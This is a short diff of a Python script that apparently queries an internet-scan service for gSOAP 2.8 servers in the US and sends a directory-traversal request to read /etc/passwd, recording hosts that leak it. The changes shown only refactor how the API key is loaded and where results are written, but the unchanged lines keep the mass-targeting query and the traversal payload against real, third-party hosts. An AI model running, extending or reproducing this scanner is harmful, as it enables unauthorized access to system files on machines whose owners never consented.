@@ -14,7 +14,13 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOURAPIKEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = 'gSOAP/2.8 country:us'
 FILE = "/../../../../../../../../../etc/passwd"
 session = requests.Session()
@@ -36,7 +42,7 @@ def grab_file (IP,PORT,FILE):
 		result = response.text
 		if response.status_code == 200:
 			if '/root:/bin/sh' in result:
-				text_file = open("./cfg/gsoap.cfg", "a")
+				text_file = open_output("cfg/gsoap.cfg", "a")
 				text_file.write("http://"+IP+":"+PORT+"\n")
 				text_file.close()
 				print ("[*] gSoap... Found [*]\n")
